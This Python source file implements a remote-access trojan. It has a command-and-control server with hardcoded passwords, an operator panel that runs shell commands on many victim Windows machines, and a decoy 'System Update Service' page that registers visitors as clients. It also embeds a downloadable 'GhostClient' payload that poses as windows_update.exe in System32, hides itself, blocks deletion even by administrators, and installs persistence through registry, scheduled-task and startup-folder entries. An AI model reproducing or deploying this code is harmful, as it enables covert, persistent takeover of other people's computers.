# server.py - Enhanced Version with Advanced Security
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver
import re

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    """Multi-threaded HTTP server for handling concurrent connections"""
    daemon_threads = True

class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
    sessions = {}
    commands_queue = {}
    failed_attempts = {}
    PASSWORD_HASH = hashlib.sha256(b"hblackhat").hexdigest()
    ADMIN_PASSWORD_HASH = hashlib.sha256(b"sudohacker").hexdigest()
    session_lock = threading.Lock()
    MAX_FAILED_ATTEMPTS = 3
    BLOCK_TIME = 300
    blocked_ips = set()
    
    def init_database(self):
        """Initialize database for activity logging"""
        self.conn = sqlite3.connect('remote_control.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                response TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id TEXT PRIMARY KEY,
                ip TEXT,
                computer_name TEXT,
                os TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS security_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                action TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.conn.commit()
    
    def log_security_event(self, action):
        """تسجيل أحداث الأمان"""
        try:
            self.cursor.execute(
                'INSERT INTO security_logs (ip, action) VALUES (?, ?)',
                (self.client_address[0], action)
            )
            self.conn.commit()
        except:
            pass
    
    def is_ip_blocked(self):
        """التحقق إذا كان IP محظور"""
        return self.client_address[0] in self.blocked_ips
    
    def block_ip(self, ip):
        """حظر IP"""
        self.blocked_ips.add(ip)
        self.log_security_event(f"IP Blocked: {ip}")
        print(f"🚫 IP Blocked: {ip}")
    
    def check_security(self):
        """فحص الأمان قبل معالجة أي طلب"""
        client_ip = self.client_address[0]
        
        if self.is_ip_blocked():
            self.send_error(403, "Access Denied - IP Blocked")
            return False
        
        user_agent = self.headers.get('User-Agent', '')
        if not user_agent or len(user_agent) < 10:
            self.log_security_event("Suspicious User-Agent")
        
        if hasattr(self, 'last_request_time'):
            current_time = time.time()
            if current_time - self.last_request_time < 0.1:
                self.block_ip(client_ip)
                return False
        
        self.last_request_time = time.time()
        return True
    
    def log_message(self, format, *args):
        """Disable verbose logs"""
        pass
    
    def do_GET(self):
        if not self.check_security():
            return
            
        try:
            parsed_path = urllib.parse.urlparse(self.path)
            path = parsed_path.path
            
            if path == '/':
                self.send_login_page()
            elif path == '/remote':
                self.send_remote_client()
            elif path == '/admin-auth':
                self.send_admin_auth_page()
            elif path == '/control':
                self.send_control_panel()
            elif path == '/sessions':
                self.send_sessions_list()
            elif path == '/commands':
                self.handle_get_commands()
            elif path == '/result':
                self.handle_get_result()
            elif path == '/download-client':
                self.download_python_client()
            elif path == '/download-python-client':
                self.download_python_client()
            elif path == '/history':
                self.send_command_history()
            elif path == '/status':
                self.send_system_status()
            else:
                self.send_404_page()
                
        except Exception as e:
            self.send_error(500, str(e))
    
    def do_POST(self):
        if not self.check_security():
            return
            
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 10000:
                self.send_error(413, "Payload too large")
                return
                
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data) if post_data else {}
            
            if self.path == '/login':
                self.handle_login(data)
            elif self.path == '/admin-login':
                self.handle_admin_login(data)
            elif self.path == '/execute':
                self.handle_execute_command(data)
            elif self.path == '/response':
                self.handle_client_response(data)
            elif self.path == '/register':
                self.handle_client_register(data)
            else:
                self.send_error(404, "Not found")
                
        except Exception as e:
            self.send_json({'error': str(e)})
    
    def send_login_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Remote Control - Authentication</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                input::placeholder { color: #ccc; }
                button { 
                    background: linear-gradient(135deg, #0078d4, #005a9e); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                    transition: all 0.3s ease;
                }
                button:hover {
                    background: linear-gradient(135deg, #005a9e, #004578);
                    transform: translateY(-2px);
                }
                .security-notice {
                    background: rgba(255,0,0,0.1);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid rgba(255,0,0,0.3);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🔒</div>
                <h2>Enhanced Remote Control</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Secure System Management - Level 1 Authentication</p>
                
                <div class="security-notice" id="securityNotice" style="display:none;">
                    ⚠️ Multiple failed attempts detected
                </div>
                
                <input type="password" id="password" placeholder="Enter Level 1 Password">
                <button onclick="login()">Authenticate</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    🔐 Multi-layer security system active
                </div>
            </div>
            <script>
                let failedAttempts = 0;
                
                function showSecurityWarning() {
                    document.getElementById('securityNotice').style.display = 'block';
                }
                
                function login() {
                    const password = document.getElementById('password').value;
                    if (!password) {
                        alert('Please enter password');
                        return;
                    }
                    
                    fetch('/login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: password})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            window.location = '/admin-auth';
                        } else {
                            failedAttempts++;
                            if (failedAttempts >= 2) {
                                showSecurityWarning();
                            }
                            alert('Authentication failed! Wrong password.');
                        }
                    }).catch(err => {
                        alert('Connection error: ' + err);
                    });
                }
                
                document.getElementById('password').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') login();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_admin_auth_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Authentication</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                button { 
                    background: linear-gradient(135deg, #e74c3c, #c0392b); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
                .security-level {
                    background: rgba(231, 76, 60, 0.2);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid #e74c3c;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🛡️</div>
                <h2>Admin Authentication</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Level 2 Security - Administrative Access</p>
                
                <div class="security-level">
                    ⚠️ HIGH SECURITY LEVEL - ADMIN ACCESS REQUIRED
                </div>
                
                <input type="password" id="adminPassword" placeholder="Enter Admin Password">
                <button onclick="adminLogin()">Admin Authentication</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    🚨 Unauthorized access will be logged and blocked
                </div>
            </div>
            <script>
                function adminLogin() {
                    const password = document.getElementById('adminPassword').value;
                    if (!password) {
                        alert('Please enter admin password');
                        return;
                    }
                    
                    fetch('/admin-login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: password})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            window.location = '/control';
                        } else {
                            alert('Admin authentication failed! Access denied.');
                        }
                    }).catch(err => {
                        alert('Connection error: ' + err);
                    });
                }
                
                document.getElementById('adminPassword').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') adminLogin();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def handle_login(self, data):
        client_ip = self.client_address[0]
        
        if client_ip in self.failed_attempts:
            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
                time_diff = time.time() - self.failed_attempts[client_ip]['last_attempt']
                if time_diff < self.BLOCK_TIME:
                    self.send_json({'success': False, 'error': 'Too many failed attempts. Try again later.'})
                    return
                else:
                    del self.failed_attempts[client_ip]
        
        password = data.get('password', '')
        if hashlib.sha256(password.encode()).hexdigest() == self.PASSWORD_HASH:
            self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
            self.log_security_event("Level 1 authentication successful")
            self.send_json({'success': True})
        else:
            if client_ip not in self.failed_attempts:
                self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
            
            self.failed_attempts[client_ip]['count'] += 1
            self.failed_attempts[client_ip]['last_attempt'] = time.time()
            
            self.log_security_event(f"Failed level 1 authentication - Attempt {self.failed_attempts[client_ip]['count']}")
            
            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
                self.block_ip(client_ip)
            
            self.send_json({'success': False})
    
    def handle_admin_login(self, data):
        client_ip = self.client_address[0]
        password = data.get('password', '')
        
        if hashlib.sha256(password.encode()).hexdigest() == self.ADMIN_PASSWORD_HASH:
            self.log_security_event("Admin authentication successful")
            self.send_json({'success': True})
        else:
            self.log_security_event("Failed admin authentication")
            self.block_ip(client_ip)
            self.send_json({'success': False})

    def send_control_panel(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Control Panel</title>
            <style>
                :root {
                    --primary: #0078d4;
                    --success: #28a745;
                    --danger: #dc3545;
                    --warning: #ffc107;
                    --dark: #1e1e1e;
                    --darker: #2d2d2d;
                    --light: #f8f9fa;
                }
                
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: var(--dark); 
                    color: var(--light); 
                    margin: 0; 
                    padding: 20px;
                    overflow-x: hidden;
                }
                
                .header {
                    background: var(--darker);
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }
                
                .container { 
                    display: grid; 
                    grid-template-columns: 350px 1fr; 
                    gap: 20px; 
                    height: 90vh; 
                }
                
                .sidebar { 
                    background: var(--darker); 
                    padding: 20px; 
                    border-radius: 10px;
                    display: flex;
                    flex-direction: column;
                }
                
                .main { 
                    display: flex; 
                    flex-direction: column;
                    gap: 20px;
                }
                
                .session-item { 
                    background: rgba(255,255,255,0.05); 
                    padding: 15px; 
                    margin: 8px 0; 
                    border-radius: 8px; 
                    cursor: pointer;
                    border: 2px solid transparent;
                    transition: all 0.3s ease;
                    position: relative;
                }
                
                .session-item:hover {
                    background: rgba(255,255,255,0.1);
                    border-color: var(--primary);
                }
                
                .session-item.active { 
                    border: 2px solid var(--success);
                    background: rgba(40, 167, 69, 0.1);
                }
                
                .session-item.offline {
                    opacity: 0.6;
                    border-color: var(--danger);
                }
                
                .online-status {
                    position: absolute;
                    top: 10px;
                    right: 10px;
                    width: 10px;
                    height: 10px;
                    border-radius: 50%;
                    background: var(--success);
                }
                
                .online-status.offline {
                    background: var(--danger);
                }
                
                .terminal { 
                    background: #000; 
                    color: #00ff00; 
                    padding: 20px; 
                    border-radius: 8px; 
                    font-family: 'Consolas', monospace; 
                    flex: 1; 
                    overflow-y: auto; 
                    white-space: pre-wrap;
                    font-size: 14px;
                    min-height: 400px;
                }
                
                button { 
                    background: var(--primary); 
                    color: white; 
                    border: none; 
                    padding: 12px 16px; 
                    margin: 4px; 
                    border-radius: 6px; 
                    cursor: pointer;
                    transition: all 0.3s ease;
                    font-weight: 500;
                }
                
                button:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
                }
                
                button.danger { background: var(--danger); }
                button.success { background: var(--success); }
                button.warning { background: var(--warning); color: #000; }
                
                .controls-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
                    gap: 8px;
                    margin: 15px 0;
                }
                
                .command-input { 
                    display: flex; 
                    margin: 15px 0; 
                    gap: 10px;
                }
                
                .command-input input { 
                    flex: 1; 
                    padding: 12px; 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                    border-radius: 6px;
                    font-family: 'Consolas', monospace;
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 10px;
                    margin: 15px 0;
                }
                
                .stat-card {
                    background: var(--darker);
                    padding: 15px;
                    border-radius: 8px;
                    text-align: center;
                }
                
                .multi-control {
                    background: var(--darker);
                    padding: 15px;
                    border-radius: 8px;
                    margin: 10px 0;
                }
                .security-badge {
                    background: linear-gradient(135deg, #e74c3c, #c0392b);
                    padding: 5px 10px;
                    border-radius: 15px;
                    font-size: 12px;
                    margin-left: 10px;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>Enhanced Remote Control Panel <span class="security-badge">SECURE</span></h2>
                <div>
                    <button onclick="loadSessions()">Refresh List</button>
                    <button onclick="executeAll('sysinfo')">System Info All</button>
                    <button class="warning" onclick="logout()">Logout</button>
                </div>
            </div>
            
            <div class="container">
                <div class="sidebar">
                    <h3>Connected Clients (<span id="clientsCount">0</span>)</h3>
                    <div id="sessionsList" style="flex: 1; overflow-y: auto; max-height: 500px;">
                        <div style="text-align: center; color: #666; padding: 20px;">
                            Loading clients...
                        </div>
                    </div>
                    
                    <div class="stats">
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold;" id="totalClients">0</div>
                            <small>Total Clients</small>
                        </div>
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold;" id="activeClients">0</div>
                            <small>Active</small>
                        </div>
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold;" id="commandsSent">0</div>
                            <small>Commands</small>
                        </div>
                    </div>
                </div>
                
                <div class="main">
                    <div style="background: var(--darker); padding: 20px; border-radius: 10px;">
                        <h3>Selected Client: <span id="currentClient" style="color: var(--success);">Not Selected</span></h3>
                        
                        <div class="multi-control">
                            <strong>Quick Commands for Selected Client:</strong>
                            <div class="controls-grid">
                                <button onclick="executeCommand('sysinfo')">System Info</button>
                                <button onclick="executeCommand('whoami')">Current User</button>
                                <button onclick="executeCommand('ipconfig /all')">Network Info</button>
                                <button onclick="executeCommand('dir')">Files List</button>
                                <button onclick="executeCommand('tasklist')">Active Processes</button>
                                <button onclick="executeCommand('netstat -an')">Network Connections</button>
                                <button onclick="executeCommand('systeminfo')">System Details</button>
                                <button onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">Disk Space</button>
                                <button onclick="executeCommand('net user')">Users</button>
                                <button onclick="executeCommand('net localgroup administrators')">Administrators</button>
                                <button onclick="executeCommand('ping google.com')">Connection Test</button>
                                <button onclick="executeCommand('calc')">Calculator</button>
                                <button onclick="executeCommand('notepad')">Notepad</button>
                                <button onclick="executeCommand('cmd /c start')">New CMD</button>
                                <button onclick="executeCommand('shutdown /a')">Cancel Shutdown</button>
                                <button class="danger" onclick="executeCommand('shutdown /s /t 60')">Shutdown 1m</button>
                                <button class="danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
                                <button onclick="executeCommand('powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')">Top Processes</button>
                                <button onclick="executeCommand('wmic product get name,version')">Installed Software</button>
                                <button onclick="executeCommand('net start')">Active Services</button>
                                <button onclick="executeCommand('schtasks /query /fo LIST')">Scheduled Tasks</button>
                                <button onclick="executeCommand('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"')">Startup Programs</button>
                            </div>
                        </div>
                        
                        <div class="command-input">
                            <input type="text" id="commandInput" placeholder="Enter custom command (e.g., ping google.com, net user, etc.)" 
                                   onkeypress="if(event.key=='Enter') executeCustomCommand()">
                            <button onclick="executeCustomCommand()">Execute Command</button>
                            <button class="success" onclick="executeSelected('commandInput')">Execute on Selected</button>
                        </div>
                    </div>
                    
                    <div class="terminal" id="terminal">
SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY

• Select a client from the left panel
• Use quick commands or enter custom commands
• You can control multiple devices simultaneously
• All activities are logged for security
• 🔒 Multi-layer security system active

                    </div>
                </div>
            </div>
            
            <script>
                let currentClientId = null;
                let commandCounter = 0;
                let allClients = [];
                
                function loadSessions() {
                    fetch('/sessions')
                        .then(r => r.json())
                        .then(sessions => {
                            allClients = sessions;
                            updateSessionStats(sessions);
                            const list = document.getElementById('sessionsList');
                            
                            if (sessions.length === 0) {
                                list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
                                return;
                            }
                            
                            list.innerHTML = sessions.map(client => {
                                const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 60000;
                                const isSelected = client.id === currentClientId;
                                const statusClass = isActive ? 'online-status' : 'online-status offline';
                                
                                return `
                                    <div class="session-item ${isSelected ? 'active' : ''} ${!isActive ? 'offline' : ''}" 
                                         onclick="selectClient('${client.id}')">
                                        <div class="${statusClass}"></div>
                                        <strong>${client.computer || client.id}</strong><br>
                                        <small>User: ${client.user || 'Unknown'}</small><br>
                                        <small>OS: ${client.os || 'Unknown'}</small><br>
                                        <small>IP: ${client.ip}</small><br>
                                        <small>Last Active: ${new Date(client.last_seen).toLocaleTimeString()}</small>
                                    </div>
                                `;
                            }).join('');
                        });
                }
                
                function updateSessionStats(sessions) {
                    const total = sessions.length;
                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 60000).length;
                    
                    document.getElementById('totalClients').textContent = total;
                    document.getElementById('activeClients').textContent = active;
                    document.getElementById('commandsSent').textContent = commandCounter;
                    document.getElementById('clientsCount').textContent = total;
                }
                
                function selectClient(clientId) {
                    currentClientId = clientId;
                    loadSessions();
                    document.getElementById('currentClient').textContent = clientId;
                    addToTerminal(`Selected client: ${clientId}\\n`);
                }
                
                function executeCommand(command) {
                    if (!currentClientId) return alert('Please select a client first!');
                    executeSingleCommand(currentClientId, command);
                }
                
                function executeSingleCommand(clientId, command) {
                    commandCounter++;
                    addToTerminal(`>> [${clientId}] ${command}\\n`);
                    
                    fetch('/execute', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({client_id: clientId, command: command})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            waitForResult(clientId, command);
                        } else {
                            addToTerminal(`Error: ${data.error}\\n`);
                        }
                    }).catch(err => {
                        addToTerminal(`Network error: ${err}\\n`);
                    });
                }
                
                function executeAll(command) {
                    if (allClients.length === 0) return alert('No clients connected!');
                    
                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 60000);
                    if (activeClients.length === 0) return alert('No active clients!');
                    
                    addToTerminal(`>> Executing command on ${activeClients.length} clients: ${command}\\n`);
                    
                    activeClients.forEach(client => {
                        executeSingleCommand(client.id, command);
                    });
                }
                
                function executeSelected(inputId) {
                    const command = document.getElementById(inputId).value.trim();
                    if (!command) return alert('Please enter a command');
                    
                    if (currentClientId) {
                        executeCommand(command);
                    } else {
                        alert('Please select a client first');
                    }
                }
                
                function executeCustomCommand() {
                    const cmd = document.getElementById('commandInput').value.trim();
                    if (cmd) {
                        executeCommand(cmd);
                        document.getElementById('commandInput').value = '';
                    } else {
                        alert('Please enter a command');
                    }
                }
                
                function waitForResult(clientId, command) {
                    let attempts = 0;
                    const maxAttempts = 60;
                    
                    const check = () => {
                        attempts++;
                        if (attempts > maxAttempts) {
                            addToTerminal(`Timeout: No response from ${clientId}\\n`);
                            return;
                        }
                        
                        fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command))
                            .then(r => r.json())
                            .then(data => {
                                if (data.result) {
                                    addToTerminal(`[${clientId}] Result:\\n${data.result}\\n`);
                                } else if (data.pending) {
                                    setTimeout(check, 1000);
                                } else {
                                    setTimeout(check, 1000);
                                }
                            }).catch(() => setTimeout(check, 1000));
                    };
                    check();
                }
                
                function addToTerminal(text) {
                    const terminal = document.getElementById('terminal');
                    terminal.textContent += text;
                    terminal.scrollTop = terminal.scrollHeight;
                }
                
                function logout() {
                    if (confirm('Are you sure you want to logout?')) {
                        window.location = '/';
                    }
                }
                
                // Auto-refresh every 3 seconds
                setInterval(loadSessions, 3000);
                loadSessions();
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_remote_client(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Update Service</title>
            <style>
                body { 
                    font-family: Arial; 
                    background: linear-gradient(135deg, #667eea, #764ba2); 
                    color: white; 
                    text-align: center; 
                    padding: 50px; 
                    margin: 0;
                }
                .container {
                    background: rgba(255,255,255,0.1);
                    padding: 40px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                }
                .loader { 
                    border: 5px solid #f3f3f3; 
                    border-top: 5px solid #3498db; 
                    border-radius: 50%; 
                    width: 50px; 
                    height: 50px; 
                    animation: spin 1s linear infinite; 
                    margin: 20px auto; 
                }
                @keyframes spin { 
                    0% { transform: rotate(0deg); } 
                    100% { transform: rotate(360deg); } 
                }
                .status {
                    margin-top: 20px;
                    padding: 10px;
                    background: rgba(255,255,255,0.2);
                    border-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>System Initialization</h2>
                <p>Loading essential security components...</p>
                <div class="loader"></div>
                <div class="status" id="status">Initializing...</div>
                <p><small>Please wait while we prepare your system environment</small></p>
            </div>
            <script>
                const clientId = 'web-' + Math.random().toString(36).substr(2, 12) + '-' + Date.now();
                let statusElement = document.getElementById('status');
                
                function updateStatus(message) {
                    statusElement.textContent = message;
                }
                
                function registerClient() {
                    updateStatus('Registering with control server...');
                    
                    fetch('/register', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            client_id: clientId,
                            user_agent: navigator.userAgent,
                            platform: navigator.platform,
                            type: 'web_client',
                            computer: navigator.platform,
                            os: navigator.userAgent
                        })
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            updateStatus('Registered successfully. Waiting for commands...');
                            startCommandListener();
                        } else {
                            updateStatus('Registration failed. Retrying...');
                            setTimeout(registerClient, 5000);
                        }
                    }).catch(err => {
                        updateStatus('Connection error. Retrying...');
                        setTimeout(registerClient, 5000);
                    });
                }
                
                function startCommandListener() {
                    setInterval(() => {
                        fetch('/commands?client=' + clientId)
                        .then(r => r.json())
                        .then(cmd => {
                            if (cmd.command) {
                                updateStatus('Executing command: ' + cmd.command);
                                let response = '';
                                
                                switch(cmd.command) {
                                    case 'sysinfo':
                                        response = `Web Client System Info:\\nUser Agent: ${navigator.userAgent}\\nPlatform: ${navigator.platform}\\nLanguage: ${navigator.language}`;
                                        break;
                                    case 'alert':
                                        response = 'Alert dialog shown to user';
                                        alert('System Notification: Security Update Required');
                                        break;
                                    default:
                                        response = `Command executed: ${cmd.command}`;
                                }
                                
                                fetch('/response', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        client_id: clientId,
                                        command: cmd.command,
                                        response: response
                                    })
                                });
                                
                                updateStatus('Command executed: ' + cmd.command);
                            }
                        }).catch(() => {});
                    }, 3000);
                }
                
                setTimeout(registerClient, 2000);
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def download_python_client(self):
        """Download UNKILLABLE Python client with advanced protection"""
        
        # ===============================================
        # 🎯 مكان كود العميل - ضع كود العميل هنا
        # ===============================================
        
        client_code = '''
import requests
import subprocess
import os
import platform
import time
import uuid
import ctypes
import sys
import winreg
import psutil
import getpass
import threading
import random
import glob

class GhostClient:
    def __init__(self, server_url="http://localhost:8080"):
        self.server_url = server_url
        self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
        self.running = True
        self.registered = False
        self.script_path = os.path.abspath(__file__)
        self.hidden_name = "windows_update.exe"
        self.hidden_path = ""
        
    def clean_old_versions(self):
        """مسح جميع النسخ القديمة من النظام"""
        try:
            # البحث عن جميع النسخ القديمة
            search_patterns = [
                os.path.join(os.environ['WINDIR'], 'System32', 'winupdate_*.exe'),
                os.path.join(os.environ['WINDIR'], 'System32', 'windows_update.exe'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'winupdate_*.exe'),
                os.path.join(os.environ['TEMP'], 'winupdate_*.exe'),
                os.path.join(os.environ['TEMP'], 'windows_update.exe'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat')
            ]
            
            for pattern in search_patterns:
                for old_file in glob.glob(pattern):
                    try:
                        # إزالة الحماية أولاً
                        subprocess.run(f'attrib -s -h -r "{old_file}"', shell=True, capture_output=True)
                        os.remove(old_file)
                        print(f"✓ Deleted old version: {old_file}")
                    except:
                        continue
                        
            # مسح المهام المجدولة القديمة
            try:
                subprocess.run('schtasks /delete /tn "WindowsSystemMaintenance" /f', shell=True, capture_output=True)
                subprocess.run('schtasks /delete /tn "WindowsUpdate" /f', shell=True, capture_output=True)
            except:
                pass
                
            # مسح إدخالات الريجستري القديمة
            try:
                subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSystemUpdate" /f', shell=True, capture_output=True)
                subprocess.run('reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /f', shell=True, capture_output=True)
            except:
                pass
                
            return "Old versions cleaned"
        except Exception as e:
            return f"Clean error: {e}"
    
    def hide_and_protect(self):
        """إخفاء وحماية الملف في النظام"""
        try:
            # المسار النهائي المخفي
            self.hidden_path = os.path.join(os.environ['WINDIR'], 'System32', self.hidden_name)
            
            # مسح النسخ القديمة أولاً
            self.clean_old_versions()
            
            # نسخ الملف إلى المكان المخفي
            with open(self.script_path, 'rb') as src:
                with open(self.hidden_path, 'wb') as dst:
                    dst.write(src.read())
            
            # إخفاء وحماية الملف
            subprocess.run(f'attrib +s +h +r "{self.hidden_path}"', shell=True, capture_output=True)
            
            # منع الحذف نهائياً
            subprocess.run(f'icacls "{self.hidden_path}" /deny Everyone:F', shell=True, capture_output=True)
            subprocess.run(f'icacls "{self.hidden_path}" /deny Administrators:F', shell=True, capture_output=True)
            
            # تحديث مسار السكريبت
            self.script_path = self.hidden_path
            
            return f"File hidden and protected at: {self.hidden_path}"
        except Exception as e:
            return f"Hide and protect error: {e}"
    
    def install_persistence(self):
        """تثبيت التشغيل التلقائي"""
        try:
            if os.name == 'nt':
                print("Installing persistence...")
                
                # 1. Registry Run (المستخدم الحالي)
                try:
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{self.hidden_path}"')
                    print("✓ Registry persistence")
                except: pass
                
                # 2. Scheduled Task (لجميع المستخدمين - الأقوى)
                try:
                    task_cmd = f'schtasks /create /tn "WindowsUpdate" /tr "\"{self.hidden_path}\"" /sc onlogon /ru SYSTEM /f'
                    subprocess.run(task_cmd, shell=True, capture_output=True, timeout=10)
                    print("✓ Scheduled task persistence")
                except: pass
                
                # 3. Startup Folder (إصلاح الخطأ هنا)
                try:
                    startup_path = os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    os.makedirs(startup_path, exist_ok=True)
                    bat_path = os.path.join(startup_path, 'WindowsUpdate.bat')
                    
                    # كتابة الملف بشكل صحيح
                    with open(bat_path, 'w') as f:
                        f.write('@echo off' + os.linesep + 'start "" "' + self.hidden_path + '"' + os.linesep)
                    
                    # إخفاء ملف الباتش
                    subprocess.run(f'attrib +s +h +r "{bat_path}"', shell=True, capture_output=True)
                    print("✓ Startup folder persistence")
                except Exception as e: 
                    print(f"Startup error: {e}")
                    
            return "Persistence installed successfully"
        except Exception as e:
            return f"Persistence failed: {e}"
    
